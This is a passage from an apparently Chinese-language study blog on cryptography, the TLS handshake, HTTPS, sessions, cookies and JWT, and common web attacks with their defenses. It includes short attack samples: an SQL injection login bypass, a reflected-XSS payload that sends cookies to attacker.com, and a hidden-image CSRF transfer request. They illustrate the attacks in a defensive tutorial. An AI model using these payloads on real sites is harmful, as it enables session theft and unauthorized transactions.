<p>为了防范碰撞攻击，密码学家和研究人员持续开发新的、更安全的哈希算法。例如，SHA-2和SHA-3系列哈希算法被认为比MD5和SHA-1更抗碰撞攻击。通过使用更安全的哈希算法，可以提高数据完整性、消息认证和数字签名等应用的安全性。</p>
<h2 id="对称加密算法"><a href="#对称加密算法" class="headerlink" title="对称加密算法"></a>对称加密算法</h2><p>对称加密算法是密码学中的一种加密方法，它使用相同的密钥（称为秘密密钥）对数据进行加密和解密。由于加密和解密过程共享相同的密钥，这种算法被称为对称加密。对称加密算法通常比非对称加密算法更快，因为它们在计算上相对简单。然而，密钥管理和安全密钥分发可能是对称加密算法面临的挑战。</p>
<p>以下是一些著名的对称加密算法：</p>
<ol>
<li>DES（Data Encryption Standard）：DES是一种曾广泛使用的对称加密算法，它使用56位密钥对数据进行加密。安全性低（曾被破解），不建议使用DES进行加密。</li>
<li>3DES（Triple DES ）：3DES是DES的改进版本，通过对数据应用三次DES加密操作来增加安全性。尽管3DES比DES更安全，但它的加密速度较慢，并且已经有更安全、更高效的替代方案。</li>
<li>AES（Advanced Encryption Standard）：AES是现代对称加密算法的事实标准，支持128、192和256位密钥长度，安全性高且加密速度快。AES被广泛应用于各种安全场景，如文件加密、安全通信和网络安全等。</li>
<li>Twofish：Twofish是Blowfish算法的继任者，也是AES算法竞争过程中的一个候选算法。Twofish使用128位的块大小和可变长度的密钥（128、192或256位）。尽管它在安全性和效率方面表现良好，但它没有像AES那样被广泛采用。</li>
</ol>
<p>对称加密算法在许多密码学应用中都有广泛应用，如保护数据的机密性、安全通信和身份认证等。然而，它们的一个主要局限性是密钥管理和分发。在许多场景中，对称加密算法与非对称加密算法结合使用。在这种混合方法中，非对称加密算法用于安全地交换对称密钥，而对称加密算法则用于实际的数据加密和解密。这种组合利用了非对称加密算法在密钥管理和分发方面安全性高的优势，同时保留了对称加密算法在数据加密和解密方面的高效性。</p>
<h2 id="非对称密钥算法"><a href="#非对称密钥算法" class="headerlink" title="非对称密钥算法"></a>非对称密钥算法</h2><p>非对称密钥算法，又称公钥加密算法，是一种加密和解密过程中使用不同密钥的加密方法。在非对称加密算法中，通常有一对密钥，一个是公钥，另一个是私钥。公钥用于加密数据，而私钥用于解密数据。以下是实际中常用的非对称密钥算法：</p>
<ol>
<li><p>RSA（Rivest-Shamir-Adleman）算法：RSA 是一种广泛应用的非对称加密算法，由 Ron Rivest、Adi Shamir 和 Leonard Adleman 于 1978 年发明。RSA 算法基于大数因子分解问题，它的安全性依赖于大数分解的困难性。RSA 用于加密、解密和数字签名，应用领域包括网页浏览器、电子邮件、VPN 等。</p>
</li>
<li><p>ElGamal 算法：ElGamal 算法由 Taher ElGamal 于 1985 年提出，基于有限域上的离散对数问题。ElGamal 算法主要应用于加密和数字签名，安全性取决于离散对数问题的难度。</p>
</li>
<li><p>ECC（Elliptic Curve Cryptography）：椭圆曲线密码学是一种基于椭圆曲线数学理论的非对称加密算法。ECC 相较于 RSA 和 ElGamal 算法具有更高的安全性和更短的密钥长度，因此在资源受限的环境（如物联网设备、智能卡等）中具有优势。ECC 可应用于加密、解密、数字签名和密钥协商等多个场景。</p>
</li>
<li><p>DSA（Digital Signature Algorithm）：DSA 是一种专门用于数字签名的非对称加密算法，由美国国家安全局（NSA）和美国国家标准与技术研究院（NIST）在 1991 年共同开发。DSA 是基于离散对数问题的，与 ElGamal 算法有相似之处。DSA 的安全性取决于离散对数问题的难度。</p>
</li>
<li><p>Lattice-based cryptography（格基密码学）：格基密码学是一种基于格数学的非对称加密算法，它具有抵抗量子计算机攻击的潜力。NTRU 和 Learning With Errors（LWE）是目前最知名的格基密码学算法。随着量子计算机的发展，格基密码学可能在未来成为一种重要的密码学工具。</p>
</li>
</ol>
<h2 id="数字签名"><a href="#数字签名" class="headerlink" title="数字签名"></a>数字签名</h2><p>数字签名是一种用于验证数据的完整性和来源的真实性的密码学技术。数字签名的基本原理是将数据（如文件、消息或电子文档）通过某种算法处理，生成一个唯一的签名。这个签名可以证明数据的完整性和发送方的身份。数字签名在许多场景中非常有用，如电子邮件、软件分发、电子合同、在线支付等。数字签名的实现通常依赖于非对称加密技术。</p>
<p>以下是数字签名的基本过程：</p>
<ol>
<li><p>数据散列（Hashing）：首先，将要签名的数据通过哈希算法即散列函数（如 SHA-256）处理，生成一个固定长度的散列值。</p>
</li>
<li><p>签名生成：使用发送方的私钥对散列值进行加密，生成数字签名。这一过程确保了只有发送方才能生成有效的签名，因为私钥是唯一的且不能被推导出来。</p>
</li>
<li><p>附加签名：将数字签名附加到原始数据上，然后将数据和签名一起发送给接收方。</p>
</li>
<li><p>签名验证：接收方首先使用相同的散列函数对收到的数据进行散列处理，得到一个散列值。然后，使用发送方的公钥对附加的数字签名进行解密，得到另一个散列值。接收方比较这两个散列值，如果它们完全相同，则说明数据未被篡改，且发送方的身份得到验证。</p>
</li>
</ol>
<p>数字签名的安全性取决于所使用的哈希算法（散列函数）和非对称加密算法的安全性。</p>
<h2 id="数字证书"><a href="#数字证书" class="headerlink" title="数字证书"></a>数字证书</h2><p>数字证书通常由一个受信任的第三方证书颁发机构（CA，Certificate Authority）颁发，CA会对证书持有人进行身份验证，并为其颁发数字证书。数字证书中包含了证书持有人的公钥，而私钥通常由证书持有人自己保存，用于进行数字签名和加密通信。</p>
<p>在数字证书的使用中，客户端和服务器之间的通信过程如下：</p>
<ol>
<li><p>服务器将自己的数字证书发送给客户端。</p>
</li>
<li><p>客户端验证证书的真实性和有效性，如果证书是由一个受信任的CA签发的，并且证书中的信息与服务器身份相符，则客户端会信任该证书。</p>
</li>
<li><p>客户端使用证书中包含的公钥对通信数据进行加密，以确保数据的保密性。</p>
</li>
<li><p>服务器使用自己的私钥对加密数据进行解密，并使用自己的私钥对数字签名进行验证，以确保通信数据的完整性和真实性。</p>
</li>
</ol>
<p>数字证书在互联网安全中发挥了重要的作用，可以用于保护网站的安全，防止中间人攻击、数据篡改等恶意行为。同时，数字证书也可以用于身份认证、数字签名等场景，确保数字数据的安全性和可信性。</p>
<h2 id="SSL-x2F-TLS"><a href="#SSL-x2F-TLS" class="headerlink" title="SSL&#x2F;TLS"></a>SSL&#x2F;TLS</h2><p>SSL（安全套接层）和TLS（传输层安全）的关系是发展演进关系。TLS是SSL的更新和改进版本。虽然二者经常一起提及，但目前主要使用的是TLS协议，因为它比SSL更安全、更先进。</p>
<p>TLS的工作原理：</p>
<ol>
<li>客户端使用非对称加密与服务器进行通信，实现身份验证并协商对称加密使用的密钥</li>
<li>采用对称加密算法对信息摘要进行加密</li>
</ol>
<p>这样，SSL&#x2F;TLS协议在服务器和客户端之间的通信使用了混合加密方案，既能确保密钥的安全分发，又能保证数据加密的高效性</p>
<h3 id="TLS-握手有哪些步骤？"><a href="#TLS-握手有哪些步骤？" class="headerlink" title="TLS 握手有哪些步骤？"></a>TLS 握手有哪些步骤？</h3><p><img src="https://cf-assets.www.cloudflare.com/slt3lc6tev37/5aYOr5erfyNBq20X5djTco/3c859532c91f25d961b2884bf521c1eb/tls-ssl-handshake.png" alt="TLS 握手"></p>
<p>TLS 握手是由客户端和服务器交换的一系列数据报或消息。TLS 握手涉及多个步骤，因为客户端和服务器要交换完成握手和进行进一步对话所需的信息。</p>
<p>TLS 握手中的确切步骤将根据所使用的密钥交换算法的种类和双方支持的密码套件而有所不同。大致如下：</p>
<ol>
<li><strong>“客户端问候（client hello）” 消息：</strong> 客户端通过向服务器发送“问候”消息来开始握手。该消息将包含客户端支持的 TLS 版本，支持的密码套件（密码套件是一组用于建立安全通信连接的算法），以及称为一串称为“客户端随机数（client random）”的随机字节。</li>
<li><strong>“服务器问候（server hello）”消息：</strong> 作为对 client hello 消息的回复，服务器发送一条消息，内含服务器的 <a target="_blank" rel="noopener" href="https://www.cloudflare.com/learning/ssl/what-is-an-ssl-certificate/">SSL 证书</a>（SSL证书是一种数字证书，是由数字证书颁发机构（CA）签发的数字证书的一种 ）、服务器选择的密码套件，以及“服务器随机数（server random）”，即由服务器生成的另一串随机字节。</li>
<li><strong>身份验证：</strong> 客户端使用颁发该证书的证书颁发机构验证服务器的 SSL 证书。此举确认服务器是其声称的身份，且客户端正在与该域的实际所有者进行交互。</li>
<li><strong>预主密钥（是在SSL&#x2F;TLS握手期间由客户端生成的随机密钥，用于协商会话密钥）：</strong> 客户端再发送一串随机字节，即“预主密钥（premaster secret）”。预主密钥是使用公钥<a target="_blank" rel="noopener" href="https://www.cloudflare.com/learning/ssl/how-does-public-key-encryption-work/">公钥</a>（客户端从服务器的 SSL 证书中获得公钥）加密的，只能使用服务器的私钥解密。</li>
<li><strong>私钥被使用：</strong>服务器对预主密钥进行解密。</li>
<li><strong>生成会话密钥：</strong>客户端和服务器均使用客户端随机数、服务器随机数和预主密钥生成会话密钥。双方应得到相同的结果。</li>
<li><strong>客户端就绪：</strong>客户端发送一条“已完成”消息，该消息用会话密钥加密。</li>
<li><strong>服务器就绪：</strong>服务器发送一条“已完成”消息，该消息用会话密钥加密。</li>
<li><strong>实现安全对称加密：</strong>已完成握手，并使用会话密钥继续进行通信。</li>
</ol>
<h3 id="TLS-握手期间会发生什么？"><a href="#TLS-握手期间会发生什么？" class="headerlink" title="TLS 握手期间会发生什么？"></a>TLS 握手期间会发生什么？</h3><p>在 TLS 握手过程中，客户端和服务器一同执行以下操作：</p>
<ul>
<li>指定将要使用的 TLS 版本（如TLS 1.0、1.2、1.3 等）</li>
<li>决定将要使用哪些密码套件</li>
<li>通过服务器的公钥和 SSL 证书颁发机构的数字签名来验证服务器的身份</li>
<li>生成会话密钥，以在握手完成后使用对称加密</li>
</ul>
<h1 id="HTTPS"><a href="#HTTPS" class="headerlink" title="HTTPS"></a>HTTPS</h1><p>HTTPS（超文本传输安全协议）是一种用于保护网络通信安全和数据传输完整性的协议。它在HTTP（超文本传输协议）的基础上添加了SSL&#x2F;TLS加密层，为数据传输提供加密、身份验证和完整性保护。</p>
<h2 id="主要作用"><a href="#主要作用" class="headerlink" title="主要作用"></a>主要作用</h2><ol>
<li>加密通信：HTTPS通过SSL&#x2F;TLS协议加密数据，确保数据在传输过程中不被未经授权的第三方窃取或篡改。</li>
<li>身份验证：HTTPS使用数字证书对服务器进行身份验证，防止用户连接到伪造的服务器，降低中间人攻击的风险。</li>
<li>数据完整性：HTTPS确保数据在传输过程中不会被篡改，从而保证了数据的完整性。</li>
</ol>
<h2 id="工作原理"><a href="#工作原理" class="headerlink" title="工作原理"></a>工作原理</h2><ol>
<li>用户在浏览器中输入HTTPS网址并发送请求。</li>
<li>服务器收到请求后返回其数字证书，包括公钥和证书颁发机构（CA）的签名等信息。</li>
<li>浏览器验证服务器证书的有效性，包括证书的颁发者、有效期等。</li>
<li>若验证通过，浏览器使用服务器的公钥加密一个随机生成的会话密钥，并将其发送给服务器。</li>
<li>服务器使用自己的私钥解密会话密钥，然后使用会话密钥对数据进行加密传输。</li>
<li>浏览器使用会话密钥对接收到的加密数据进行解密，展示网页内容。</li>
</ol>
<h1 id="Session、Cookie、Token"><a href="#Session、Cookie、Token" class="headerlink" title="Session、Cookie、Token"></a>Session、Cookie、Token</h1><h2 id="Session"><a href="#Session" class="headerlink" title="Session"></a>Session</h2><p>Session 是服务器端用来跟踪和维护用户状态的技术。服务器为每个用户创建一个唯一的 Session ID，并将其与用户的会话数据关联。Session ID 通常通过 Cookie、URL 参数或隐藏表单字段的方式传递给客户端。Session 主要用于识别用户身份、存储用户信息等场景。</p>
<p><code>HttpSession</code> 对象并不是 <code>HttpServletRequest</code> 自带的，但可以通过 <code>HttpServletRequest</code> 对象的 <code>getSession</code> 方法轻松获取。当调用 <code>request.getSession()</code> 时，如果当前请求没有关联的会话，它会自动为您创建一个新的会话。如果只想在已经存在的会话中获取，而不创建新的会话，可以调用 <code>request.getSession(false)</code>。这样，如果没有关联的会话，它将返回 <code>null</code>。</p>
<h2 id="Cookie"><a href="#Cookie" class="headerlink" title="Cookie"></a>Cookie</h2><p>Cookie 是一种存储在客户端（如浏览器）的小型文本文件，用于保存服务器发送给客户端的信息。服务器可以设置、读取和修改 Cookie 以识别和追踪用户。Cookie 可以存储一些简单的数据，如用户 ID、登录状态等。</p>
<p><code>Cookie</code> 对象不是 <code>HttpServletRequest</code> 自带的，但可以通过 <code>HttpServletRequest</code> 对象的 <code>getCookies</code> 方法轻松获取。这个方法会返回一个 <code>Cookie</code> 数组，其中包含客户端发送给服务器的所有 Cookie。若客户端没有发送任何 Cookie，这个方法将返回 <code>null</code>。</p>
<h2 id="Session和Cookie的区别"><a href="#Session和Cookie的区别" class="headerlink" title="Session和Cookie的区别"></a>Session和Cookie的区别</h2><ol>
<li>存储位置不同：Session 存储在服务器端，依赖于 Cookie 或其他方式传递 Session ID；Cookie 存储在客户端；</li>
<li>存储的数据类型不同：Session能够存储任意的JAVA对象，Cookie只能存储String类型的对象。</li>
</ol>
<h2 id="Token"><a href="#Token" class="headerlink" title="Token"></a>Token</h2><h3 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h3><p>Token又称“令牌”，Token是服务端生成的一串字符串，用于身份验证，当第一次登录后，服务器生成一个Token并将此Token返回给客户端，以后客户端只需带上这个Token前来请求数据，服务器就可以根据Token信息验证客户端的身份并确定其访问权限。</p>
<h3 id="引入目的"><a href="#引入目的" class="headerlink" title="引入目的"></a>引入目的</h3><p>Token（令牌）的引入是为了解决一些基于传统 Session 和 Cookie 机制的安全性和可扩展性问题。Token 的设计思路是为了在客户端和服务器之间建立一种无状态、可靠的身份验证机制。引入 Token 的原因主要包括以下几点：</p>
<ol>
<li><p>分布式系统和微服务：在分布式系统和微服务架构中，多个不同的服务器可能需要处理同一个客户端的请求。这种情况下，使用基于服务器的会话管理（如 Session + Cookie）可能导致不一致的状态。Token 提供了一种无状态的解决方案，可以在不同的服务器间共享和验证，从而更适合分布式和微服务环境。</p>
</li>
<li><p>安全性：Token 可以提供更好的安全性。相对于传统的 Cookie 机制，Token 可以降低 CSRF（跨站请求伪造）攻击的风险。此外，Token 可以包含签名或加密，以确保数据的完整性和安全性。例如，JWT（JSON Web Token）就是一种常见的 Token 实现方式，它支持签名和加密。</p>
</li>
<li><p>跨域访问：Token 可以更轻松地支持跨域访问。在基于 Token 的身份验证中，客户端可以将 Token 放在请求头（如 <code>Authorization</code> 头）中，从而避免浏览器的 Cookie 跨域限制。</p>
</li>
<li><p>多设备和多平台支持：Token 可以灵活地应用于不同的客户端设备和平台。由于 Token 可以通过请求头、URL 参数或请求体等多种方式传输，它可以轻松地在 Web、移动设备和桌面应用等多种场景下使用。</p>
</li>
<li><p>易于集成：Token 机制通常易于与第三方服务集成，如 OAuth2 和 OpenID Connect 等身份验证协议。这些协议允许用户使用第三方帐户（如 Google、Facebook 或 GitHub）登录应用，而无需创建新的帐户。</p>
</li>
</ol>
<p>总之，Token 引入主要是为了解决传统基于 Session 和 Cookie 的身份验证机制在安全性、可扩展性和跨平台支持方面的挑战。Token 为构建无状态、可扩展且安全的身份验证解决方案提供了一种有效的方法。</p>
<h3 id="Token-可以降低-CSRF（跨站请求伪造）攻击的风险的原理"><a href="#Token-可以降低-CSRF（跨站请求伪造）攻击的风险的原理" class="headerlink" title="Token 可以降低 CSRF（跨站请求伪造）攻击的风险的原理"></a>Token 可以降低 CSRF（跨站请求伪造）攻击的风险的原理</h3><p>要达到在使用Token后降低 CSRF攻击风险的目的，可以将Token放到请求头，（如 <code>Authorization</code> 头）中，攻击者在跨站请求中很难修改请求头，并且浏览器不会像处理 Cookie 那样自动将其发送到服务端，需要在编写客户端代码时，手动获取 Token 并将其添加到请求头中，这就阻止了攻击者将 Token 附加到恶意请求中。这种显式发送 Token 的方式有助于降低 CSRF 攻击的风险。</p>
<p>将 Token 存储在 Cookie 里面并不能降低 CSRF 风险，这样做会使应用面临与传统基于 Cookie 的身份验证相同的 CSRF 攻击风险。</p>
<p>对于存储在客户端代码的某个存储位置（如 LocalStorage、SessionStorage 或内存，非cookie）的 Token，要求开发者在编写客户端代码时，手动获取 Token 并将其添加到请求头中。例如：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">fetch</span>(<span class="string">&#x27;https://example.com/api/resource&#x27;</span>, &#123;</span><br><span class="line">  <span class="attr">headers</span>: &#123;</span><br><span class="line">    <span class="string">&#x27;Authorization&#x27;</span>: <span class="string">&#x27;Bearer &#x27;</span> + token</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<h3 id="JWT"><a href="#JWT" class="headerlink" title="JWT"></a>JWT</h3><p>JWT（JSON Web Token）是一种用于身份验证和授权的开放标准（RFC 7519），它定义了一种紧凑、自包含的 Token 结构。JWT 使用 JSON 对象表示一组声明（Claim），并将其进行 Base64Url 编码和签名或加密，以确保数据的完整性和安全性。JWT 由三部分组成：头部（Header）、载荷（Payload）和签名（Signature）。</p>
<p>Token 和 JWT 的关系是：JWT 是 Token 的一种实现方式。Token 是一种更通用的概念，可以有多种实现方式和数据格式。JWT 是一种具体的 Token 实现，它使用 JSON 对象表示 Token 的内容，并通过 Base64Url 编码和签名或加密来确保数据的完整性和安全性。由于 JWT 的紧凑和自包含特性，它在许多场景下被广泛使用，如身份验证、授权和单点登录（SSO）等。</p>
<ul>
<li><p>JSON Web Token（JWT）是一种轻量级的身份验证和授权机制，它使用JSON格式对信息进行编码，以实现安全传输和存储。JWT通常用于Web应用程序中，用于在客户端和服务器之间传递安全的身份认证信息和其他数据。</p>
</li>
<li><p>JWT由三部分组成：头部（Header）、载荷（Payload）和签名（Signature）。头部包含有关令牌类型和加密算法的信息；载荷包含有关用户和其他授权信息的信息；签名用于验证令牌的真实性和完整性。</p>
</li>
<li><p>在使用JWT进行身份验证时，服务器通常会在成功验证用户凭据后生成JWT，然后将其发送给客户端。客户端可以在每次请求时将JWT发送回服务器进行身份验证。服务器会验证JWT的签名，并解码载荷中的信息，以确认用户的身份和其他授权信息。</p>
</li>
<li><p>JWT具有以下优点：</p>
<ul>
<li><p>轻量级：JWT使用JSON格式进行编码，可以在客户端和服务器之间轻松传输和存储，而不需要使用复杂的数据格式和协议。</p>
</li>
<li><p>自包含性：JWT包含了所有必要的信息，例如用户身份和其他授权信息，使得在客户端和服务器之间进行身份验证和授权变得非常简单。</p>
</li>
<li><p>可扩展性：JWT的载荷可以包含任意的信息，例如用户ID、角色、权限等信息，以满足不同的应用需求。</p>
</li>
<li><p>安全性：JWT使用签名对令牌进行验证和保护，防止令牌被篡改和伪造。</p>
</li>
</ul>
</li>
<li><p>总之，JWT是一种简单而安全的身份验证和授权机制，可以用于Web应用程序中，以确保用户身份的安全性和可信性。</p>
</li>
</ul>
<h1 id="Web安全"><a href="#Web安全" class="headerlink" title="Web安全"></a>Web安全</h1><h2 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h2><p>SQL注入（SQL Injection）是一种常见的网络安全漏洞，攻击者通过在用户输入中注入恶意的 SQL 代码，从而操纵后端数据库，获取未授权的数据访问、修改数据、执行管理操作甚至执行任意代码。这种攻击方式通常是由于对用户输入的不充分验证和处理导致的。</p>
<p>以下是一个简单的 SQL 注入攻击示例。假设我们有一个基于用户输入的用户名和密码来验证用户身份的 Web 应用。在不考虑 SQL 注入的情况下，登录查询可能如下：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> username <span class="operator">=</span> <span class="string">&#x27;$username&#x27;</span> <span class="keyword">AND</span> password <span class="operator">=</span> <span class="string">&#x27;$password&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p>在这里，<code>$username</code> 和 <code>$password</code> 是从用户输入中获取的。攻击者可以在用户名或密码字段中输入恶意 SQL 代码，例如在用户名字段中输入：<code>admin&#39; --</code>。这会导致生成以下查询：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> username <span class="operator">=</span> <span class="string">&#x27;admin&#x27;</span> <span class="comment">--&#x27; AND password = &#x27;&#x27;;</span></span><br></pre></td></tr></table></figure>

<p>在这个例子中，<code>--</code> 是 SQL 中的注释符号，从而使得密码验证部分被注释掉，攻击者可以绕过密码验证，成功登录管理员账户。</p>
<p>为了防止 SQL 注入攻击，可以采取以下措施：</p>
<ol>
<li>参数化查询：使用参数化查询（也称为预编译语句或绑定变量）来与数据库交互，而不是直接在 SQL 语句中拼接用户输入。在SQL语句中，变量用?表示，攻击者就无法改变SQL的结构。参数化查询会将用户输入作为参数传递给查询，而不是作为查询的一部分，从而避免 SQL 注入。</li>
<li>输入验证：对用户输入进行严格的验证，限制允许的字符集和格式。例如，可以限制用户名和密码只包含字母和数字。</li>
<li>使用存储过程：将 SQL 代码封装在数据库中的存储过程中，并通过参数调用这些过程。这样可以确保 SQL 代码不受用户输入的影响。</li>
<li>最小权限原则：限制应用程序连接数据库的权限，使其只能访问必要的数据和执行必要的操作，避免使用root等高级权限账户直接连接数据库。这样即使攻击者发起了 SQL 注入攻击，对数据库的潜在破坏也会受到限制。</li>
<li>数据库错误处理：不要向用户显示详细的数据库错误信息，因为这可能为攻击者提供有关数据库结构和配置的敏感信息。应该将详细的错误信息记录在日志中，并向用户显示简洁的错误消息。</li>
</ol>
<h2 id="跨站脚本攻击（XSS攻击）"><a href="#跨站脚本攻击（XSS攻击）" class="headerlink" title="跨站脚本攻击（XSS攻击）"></a>跨站脚本攻击（XSS攻击）</h2><p>跨站脚本攻击（Cross-Site Scripting，简称 XSS）是一种常见的网络安全漏洞，攻击者通过在 Web 应用中注入恶意的脚本（通常为 JavaScript），以受害者身份在其浏览器上执行这些脚本。这种攻击方式通常是由于对用户输入的不充分验证和处理导致的。</p>
<p>XSS 攻击主要分为三类：</p>
<ol>
<li><p>反射型 XSS：恶意脚本通过 URL 参数传递，当用户点击含有恶意链接的网站或邮件时，攻击者的脚本随请求发送到服务器。攻击者可以构造一个恶意链接，将包含恶意脚本的关键词作为 URL 参数传递：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="comment">//example.com/search?search=&lt;script&gt;document.location=&#x27;https://attacker.com/steal?cookie=&#x27;+encodeURIComponent(document.cookie);&lt;/script&gt;</span></span><br></pre></td></tr></table></figure>

<p>当受害者点击这个恶意链接时，恶意脚本会作为参数发送到服务器，然后服务器将脚本嵌入到响应页面中。最后，当受害者浏览器加载页面时，恶意脚本被执行。在这个例子中，恶意脚本将受害者的 Cookie 信息发送到攻击者控制的网站。</p>
</li>
<li><p>存储型 XSS：恶意脚本被存储在服务器上，当受害者访问包含恶意脚本的页面时，脚本被加载并执行。比如，黑客写下一篇含有恶意代码的博客文章，所有访问该博客文章的用户都会在他们的浏览器中执行这段恶意的代码，就会把恶意的脚本保存到服务端。</p>
</li>
<li><p>DOM 型 XSS：这类攻击不涉及服务器，而是在客户端通过操纵 DOM（文档对象模型）实现。攻击者在 URL 参数或其他输入途径中注入恶意脚本，然后通过客户端 JavaScript 代码将脚本插入到 DOM 中并执行。</p>
</li>
</ol>
<p>XSS 攻击可能导致以下危害：</p>
<ul>
<li>窃取用户敏感信息（如 Cookie、会话令牌等）</li>
<li>模拟用户行为</li>
<li>利用受害者的身份执行恶意操作</li>
<li>向受害者展示虚假信息</li>
</ul>
<p>为了防止 XSS 攻击，可以采取以下措施：</p>
<ol>
<li><p>输入验证：对用户输入进行严格的验证，限制允许的字符集和格式。</p>
</li>
<li><p>输出编码：在将用户输入插入到 HTML 页面中之前，对其进行适当的编码，以防止恶意脚本被解释执行。例如，将尖括号 <code>&lt;</code> 和 <code>&gt;</code> 转换为 HTML 实体 <code>&amp;lt;</code> 和 <code>&amp;gt;</code>。</p>
</li>
<li><p>使用内容安全策略（CSP）：CSP 是一种安全特性，可以限制浏览器加载和执行外部资源（如脚本、样式表等）。通过配置 CSP，可以限制脚本来源、禁止内联脚本执行等，从而降低 XSS 攻击的风险。</p>
</li>
<li><p>使用 HttpOnly Cookie：将敏感信息（如会话令牌）存储在 HttpOnly Cookie 中，这样 JavaScript 无法访问这些 Cookie，即使发生 XSS 攻击，攻击者也无法窃取这些敏感信息。</p>
</li>
<li><p>保持软件更新：及时更新 Web 应用程序及其依赖库，以修复可能存在的安全漏</p>
</li>
</ol>
<h2 id="跨站请求伪造攻击（CSRF攻击）"><a href="#跨站请求伪造攻击（CSRF攻击）" class="headerlink" title="跨站请求伪造攻击（CSRF攻击）"></a>跨站请求伪造攻击（CSRF攻击）</h2><p>跨站请求伪造（Cross-Site Request Forgery，简称 CSRF）是一种网络安全漏洞，攻击者利用受害者的登录状态，在受害者不知情的情况下伪造请求，让受害者执行攻击者指定的操作。这种攻击方式通常利用用户在其他网站的登录状态，以及浏览器自动发送 Cookie 的特性。</p>
<p>以下是一个简单的 CSRF 攻击示例。假设我们有一个银行网站，用户在登录后可以进行转账操作。转账请求可能如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://bank.example.com/transfer?to=account&amp;amount=100</span><br></pre></td></tr></table></figure>

<p>在这里，<code>to</code> 参数表示收款人账户，<code>amount</code> 参数表示转账金额。正常情况下，用户登录银行网站后，通过填写表单发起转账请求。</p>
<p>攻击者可以构造一个恶意网站或电子邮件，包含一个自动发起转账请求的图像标签：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;https://bank.example.com/transfer?to=attacker_account&amp;amount=1000&quot;</span> <span class="attr">width</span>=<span class="string">&quot;0&quot;</span> <span class="attr">height</span>=<span class="string">&quot;0&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure>

<p>当受害者访问恶意网站或查看恶意邮件时，浏览器会自动加载图像，从而发起转账请求。如果受害者同时处于银行网站的登录状态，由于浏览器会自动发送 Cookie，转账请求会被银行网站视为合法操作并执行。</p>
<p>为了防止 CSRF 攻击，可以采取以下措施：</p>
<ol>
<li><p>使用安全令牌：为每个会话或表单生成一个随机的安全令牌，将其嵌入到表单或请求中。服务器需要验证表单中的令牌与请求信息中（如Session或Cookie）的令牌是否匹配，以确保请求来自合法用户。</p>
</li>
<li><p>SameSite Cookie：将 Cookie 的 SameSite 属性设置为 <code>Strict</code> 或 <code>Lax</code>，以防止跨站请求发送 Cookie。这样，即使攻击者发起 CSRF 攻击，请求也不会附带有效的 Cookie，从而阻止攻击。</p>
</li>
<li><p>验证请求来源：检查请求的来源（如 <code>Referer</code> 和 <code>Origin</code> 头），确保请求来自可信的网站。这可以防止跨站请求，但可能受到某些限制（如代理和浏览器设置）。</p>
</li>
<li><p>双重验证：对于敏感操作（如转账、密码修改等），使用双重验证（如短信验证码、邮件确认等）确保用户确实想要执行该操作。</p>
</li>
<li><p>使用自定义请求头：为 AJAX 请求添加自定义请求头，例如 CSRF-Token，因为跨站请求通常无法修改请求头。在服务器端，验证请求头中的 CSRF-Token 是否有效。</p>
</li>
</ol>
<h2 id="点击劫持攻击"><a href="#点击劫持攻击" class="headerlink" title="点击劫持攻击"></a>点击劫持攻击</h2><p>点击劫持攻击是一种网络安全漏洞，攻击者通过在受害者浏览器中重叠不透明或透明的 Web 页面层，诱导受害者在不知情的情况下点击或与被遮盖的原始页面上的元素进行交互。这种攻击通常利用 HTML 和 CSS 技术实现，并可能导致用户泄露敏感信息或执行不安全操作。</p>
<p>为了防止点击劫持攻击，可以采取以下措施：</p>
<ol>
<li><p>frame busting：通常可以写一段JavaScript代码，以禁止iframe的嵌套，这种方法叫frame busting</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (top.<span class="property">location</span> != location) &#123;</span><br><span class="line">	top.<span class="property">location</span> = self.<span class="property">location</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>使用 X-Frame-Options 响应头：frame busting存在被绕过的可能，比较好的方案是使用一个HTTP头，X-Frame-Options，服务器可以发送 X-Frame-Options 响应头来指示浏览器不允许将网站嵌入到 iframe 中。这将阻止攻击者使用 iframe 构建点击劫持攻击。例如，设置 <code>X-Frame-Options: DENY</code> 将完全禁止嵌入。</p>
</li>
</ol>
<h2 id="拒绝服务攻击（DDoS-攻击）"><a href="#拒绝服务攻击（DDoS-攻击）" class="headerlink" title="拒绝服务攻击（DDoS 攻击）"></a>拒绝服务攻击（DDoS 攻击）</h2><p>拒绝服务攻击（Denial of Service, 简称 DoS）是一种网络安全攻击，其目的是让目标系统或网络资源无法正常提供服务。分布式拒绝服务攻击（Distributed Denial of Service, 简称 DDoS）是 DoS 攻击的一种，它利用大量分布在不同位置的攻击者（通常是通过僵尸网络）同时向目标发起攻击，从而更有效地干扰目标系统的正常运行。</p>
<p>DDoS 攻击有多种类型，主要分为以下三类：</p>
<ol>
<li><p>网络层攻击：这类攻击主要针对网络基础设施，例如通过 ICMP 洪水攻击，来消耗目标的网络带宽资源，导致正常用户无法访问。</p>
<p>防御措施：</p>
<ul>
<li>增加网络带宽：提升网络带宽可以缓解网络层攻击带来的影响。</li>
<li>配置防火墙规则：限制 ICMP、UDP 流量，减少恶意流量进入网络。</li>
